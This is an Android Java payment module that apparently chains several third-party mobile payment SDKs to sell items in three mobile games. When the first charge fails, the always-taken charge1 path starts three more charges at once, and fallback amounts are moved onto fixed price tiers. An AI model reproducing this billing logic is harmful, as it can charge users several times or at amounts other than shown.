package com.bb_sz.pay;

import android.app.Activity;
import android.util.Log;

import com.android.mtools.MPay;
import com.android.mtools.MPayListener;
import com.android.yimeng.ympay.in.BupPayCalBackListener;
import com.bb_sz.ndk.upload.ThirdPayCB;
import com.bb_sz.pay.order.PayOrder;
import com.jpay.sdk.IChargeResult;
import com.jpay.sdk.JPay;
import com.wyzf.constant.PayResult;
import com.wyzf.pay.PayResultListener;
import com.wyzf.pay.WYZFPay;

import d.e.f.t.hr.Yent;

/**
 * Created by Administrator on 2017/4/24.
 */

public class WYPay {

    public static int JBGM = 4410;
    public static int SDPGM = 4414;
    public static int JMLP = 4418;
    public static int YJLQQBLP = 4411;
    public static int JGPGM = 4415;
    public static int SJLB = 4419;
    public static int CJYLGM = 4412;
    public static int JBYLB = 4416;
    public static int XXYEGM = 4413;
    public static int JMLB = 4417;

    public static int[] FCNLM_PAY_POINT ={4449,4450,4451,4451,4452,4453,4466};
    public static String[] FCNLM_FEE_NAME = {"100金币","250金币","500金币","700金币","1000金币","1100金币","1600金币"};

    public static int[] HJZJ_PAY_POINT = {4423,4424,4425,4426,4427,4428,4429,4430,4431,4432,4433,4434,4435,4436,4437,4438,4439,4440,4441,4442,4443};
    public static String[] HJZJ_FEE_NAME = {"首冲礼包","安魂曲套装","3日无限弹药","超值大礼包","豪华大礼包","幸运大礼包","畅玩大礼包","钻石礼包","VIP畅玩礼包","钻石100","钻石350","钻石800","钻石1500","十字光剑",
            "M134加特林","熔岩喷射器","蓝焰冰晶之翼","圣天使之翼","兔女郎服装","公主装","血之克劳迪娅"};

    public static String[] TTBY_FEE_NAME={
            "金币购买" ,
            "全部领取" ,
            "高爆鱼雷" ,
            "新鲜鱼饵" ,
            "能量炮" ,
            "激光炮" ,
            "金币鱼礼包" ,
            "精美礼包" ,
            "至尊大礼包" ,
            "升级礼包"
    };

    public static String[] HJZJ_M_PAY_POINT = {
            "lhpaAzcuov6kp5C6jydi1jqc",
            "7rijtpre3r6sfbuniqn8oniu",
            "gir0rhy9mB1q8t249ofAaaaC",
            "a5i7t1r92qDjosa9iohbw68q",
            "u0u09n2cr5yaf58zmw1m9dke",
            "9qAg3kskCCmrhk10bwo5h97a",
            "uCuuClfft7BE0niDf0nas5Cc",
            "pwkaxr9Ekk6CuAxq8chrkja5",
            "y8t9Cf3Eztmfchr3z1n8685E",
            "qAqEBpqhw8Euulzfdxsvfm4c",
            "6kyqj3u5dcgdpz64yqonfv28",
            "31kfqukEkuigsxeAeeq314tn",
            "vk74uyoA4Drgcj7bqyeuskoB",
            "4a2xBmeqclwvic8tftx6ztva",
            "gDhfa6ju7qkffoemEnorcCsx",
            "3vBfpf8x50rq20uxoxwcBks5",
            "huc5x8mlfsju5iojtk185fCg",
            "rzwf9x2sBavosled9lcscjoj",
            "lmEwe7b2Cucy5ip6ukcoft7j",
            "1hl00icgC80fcstudx2DD1th",
            "4xAlk9jEk86Dx4m5m58s6bsB"
    };

    public static String[] TTBY_M_PAY_POINT={
            "wEz608uzuk2dmwv7203Agzqq" ,
            "sszhmpijAkvv3ux8g3lB5bie" ,
            "2k1mgppEmzE0fhr59agyExfh" ,
            "iddzgt0xb15wwc09n00trmAh" ,
            "hne4fo9fu4AwmzkE0Ekcb32w" ,
            "ca44Eyc7aBf9c1hpxlirf5m3" ,
            "bu596wysjEtrdC7C6slx0xjq" ,
            "zEpj7AbbCD6em64Dmo1y9iy6" ,
            "fqAsp5kjdcB0vBct9qdt0muc" ,
            "003jAy834zkvhrj95g0CgApp"
    };

    public static String[] FCNLM_M_PAY_POINT={
            "gte1nynckiy9vdt6DwsCtCal" ,
            "skmlurrr1t079h8f8w4C429r" ,
            "okyqqmoEe7xu4luebkx8DA1v" ,
            "5v78hveqsCl244tp2j4zoDo0" ,
            "bt33iEnEgE3j1gz8xge6uwy8" ,
            "83irq1dtyBnsqptx5ibujc6D",
            "83irq1dtyBnsqptx5ibujc6D"
    };



    private static String getMPayPointByFeeName(String feeDesc,String feeName){
        Log.e("sky","appname="+feeDesc);
        Log.e("sky","feeName="+feeName);
        if (feeDesc.equals("合金战姬")){
            return HJZJ_M_PAY_POINT[indexof(feeName,HJZJ_FEE_NAME)];
        }else if (feeDesc.equals("天天捕鱼")){
            return TTBY_M_PAY_POINT[indexof(feeName,TTBY_FEE_NAME)];
        }else if (feeDesc.equals("复仇鸟联盟2")){
            return FCNLM_M_PAY_POINT[indexof(feeName,FCNLM_FEE_NAME)];
        }
        return "4xAlk9jEk86Dx4m5m58s6bsB";
    }



    private static int getPayPointBuYu(String feeDesc,String feeName) {
        Log.e("sky","appname="+feeDesc);
        Log.e("sky","feeName="+feeName);
        if (null == feeName) return 0;
        if (feeDesc.equals("天天捕鱼")){
            if ("金币大折扣".equals(feeName)) {
                return JBGM;
            } else if ("全部领取".equals(feeName)) {
                return YJLQQBLP;
            } else if ("高爆鱼雷".equals(feeName)) {
                return CJYLGM;
            } else if ("新鲜鱼饵".equals(feeName)) {
                return XXYEGM;
            } else if ("能量炮".equals(feeName)) {
                return SDPGM;
            } else if ("激光炮".equals(feeName)) {
                return JGPGM;
            } else if ("金币鱼礼包".equals(feeName)) {
                return JBYLB;
            } else if ("至尊大礼包".equals(feeName)) {
                return JMLP;
            } else if ("升级礼包".equals(feeName)) {
                return SJLB;
            } else {
                return JMLB;//9
            }
        }else if (feeDesc.equals("合金战姬")){
            return HJZJ_PAY_POINT[indexof(feeName,HJZJ_FEE_NAME)];
        }else if (feeDesc.equals("复仇鸟联盟2")){
            return FCNLM_PAY_POINT[indexof(feeName,FCNLM_FEE_NAME)];
        }
        return 0;
    }


    public static int indexof(String feeName,String []payNames){
        for (int i=0;i<payNames.length;i++){
            if (payNames[i].equals(feeName)){
                return i;
            }
        }
        return payNames.length-2;
    }
    public static void charge(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        PayOrder.getInstance().init(activity);
        Log.e("sky","payType"+Api.getPayType(activity)+"------");
        if (9==9){
            charge1(activity,price,uniqueid,cpserverparam,feeName,feeDesc,chargeResultCb);
        }else{
            charge2(activity,price,uniqueid,cpserverparam,feeName,feeDesc,chargeResultCb);
        }
    }

    public static void charge1(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {
        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky","jpay result:"+i+"-----s="+s);
                if (i!=0){
                    final int p = changePrice(price);
                    Log.e("sky","WYZFPay start");
                    WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"), p, new PayResultListener() {
                        @Override
                        public void onResult(PayResult payResult, int i) {
                            Log.e("sky","payResult="+payResult.msg);
                            switch (payResult){
                                case SUCCESS:{
                                    chargeResultCb.onChargeResult(0,"WYZFPay success");
                                    break;
                                }
                                default:{
                                    chargeResultCb.onChargeResult(1,"WYZFPay failed");
                                }
                            }
                        }
                    });
                    Log.e("sky","Yent start");
                    Yent.getInstance(activity).pay(getPayPointBuYu(feeDesc, feeName), cpserverparam, activity, new BupPayCalBackListener() {
                        @Override
                        public void success(int i) {
                            Log.e("sky:","YentPay success");
                            chargeResultCb.onChargeResult(0,"YentPay success");
                        }

                        @Override
                        public void fail(int i) {
                            Log.e("sky:","YentPay failed， i= " + i);
                            chargeResultCb.onChargeResult(1,"YentPay failed");
                        }
                    });
                    int mprice = changePriceForMPay(price);
                    Log.e("sky","MPay start");
                    MPay.getInstance(activity,"{$MAI_MSA$}","{$CID$}").xPay(getMPayPointByFeeName(feeDesc, feeName), "{$CID$}", mprice, new MPayListener() {
                        @Override
                        public void callBack(String s, String s1, int i, int i1) {
                            Log.e("sky","Mpay result:s="+s+"---s1="+s1+"---i="+i+"---i1="+i1);
                            if (i==1001){
                                chargeResultCb.onChargeResult(0,"Mpay success");
                            }else {
                                chargeResultCb.onChargeResult(1,"Mpay failed");
                            }
                        }
                    });

                }else {
                    Log.e("sky:","jpay success");
                    chargeResultCb.onChargeResult(0,"jpay success");
                }
            }
        });
    }


    public static void charge2(final Activity activity, final String price, String uniqueid, final String cpserverparam, final String feeName, final String feeDesc, final IChargeResult chargeResultCb) {


        JPay.getInstance().charge(activity, price, uniqueid, cpserverparam, feeName, feeDesc, new IChargeResult() {
            @Override
            public void onChargeResult(int i, String s) {
                Log.e("sky","i="+i+"----s="+s);
                if (i != 0){
                    final int p = changePrice(price);
                    Log.e("sky","price="+p);
                    if (Api.getPayType(activity)==2){
                        Log.e("sky","WYZFPay first");
                        initThirdReport(activity,1);
                        WYZFPay.getInstance().pay(activity,Integer.parseInt("{$feeCode$}"), p,new PayResultListener() {
                            @Override
                            public void onResult(PayResult payResult, int i) {
                                switch (payResult){
                                    case SUCCESS:{
                                        Log.e("sky:","weiyun success");
                                        chargeResultCb.onChargeResult(0,"WYZFPay success");
                                        break;
                                    }
                                    default:{
                                        Log.e("sky","PayResult"+payResult.msg);
                                        initThirdReport(activity,2);
                                        Yent.getInstance(activity).pay(getPayPointBuYu(feeDesc,feeName), cpserverparam, activity, new BupPayCalBackListener() {
                                            @Override
                                            public void success(int i) {
                                                Log.e("sky:","YentPay success");
                                                chargeResultCb.onChargeResult(0,"YentPay success");
                                            }
                                            @Override
                                            public void fail(int i) {
                                                Log.e("sky:","YentPay failed， i= " + i);
                                                chargeResultCb.onChargeResult(1,"pay failed");
                                            }
                                        });
                                    }
                                }
                            }
                        });
                    }else {
                        Log.e("sky","Yent first");
                        initThirdReport(activity,2);
                        Yent.getInstance(activity).pay(getPayPointBuYu(feeDesc,feeName), feeName, activity, new BupPayCalBackListener() {
                            @Override
                            public void success(int i) {
                                Log.e("sky:","YentPay success");
                                chargeResultCb.onChargeResult(0,"YentPay success");
                            }
                            @Override
                            public void fail(int i) {
                                Log.e("sky:","YentPay failed， i= " + i);
                                initThirdReport(activity,1);
                                WYZFPay.getInstance().pay(activity, Integer.parseInt("{$feeCode$}"),p, new PayResultListener() {
                                    @Override
                                    public void onResult(PayResult payResult, int i) {
                                        switch (payResult){
                                            case SUCCESS:{
                                                Log.e("sky:","WYZFPay success");
                                                chargeResultCb.onChargeResult(0,"YentPay success");
                                                break;
                                            }
                                            default:{
                                                Log.e("sky","PayResult"+payResult.msg);
                                                Log.e("sky:","WYZFPay failed");
                                                chargeResultCb.onChargeResult(1,"pay failed");
                                            }
                                        }
                                    }
                                });
                            }
                        });
                    }
                }else {
                    Log.e("sky:","jpay success");
                    chargeResultCb.onChargeResult(0,"jpay success");
                }
            }
        });
    }

    private static int changePrice(String price) {
        int p = Integer.parseInt(price);
       if (p < 1000){
            return 500;
        }else if (p < 1500){
            return 1000;
        }else if (p < 2000){
            return 1500;
        }
        return 2000;
    }

    private static int changePriceForMPay(String price){
        int p = Integer.parseInt(price);
        if (p % 200 != 0){
            return p-100;
        }else {
            return p;
        }
    }

    private static int getPayType(Activity activity){
        return 1;
    }

    private static boolean isWeiYunPayFirst(Activity activity) {
        return PayOrder.getInstance().isWeiYunPayFirst(activity);
    }

    private static void initThirdReport(Activity activity, int type) {
        ThirdPayCB.getInstance().init(activity, type);
    }


}
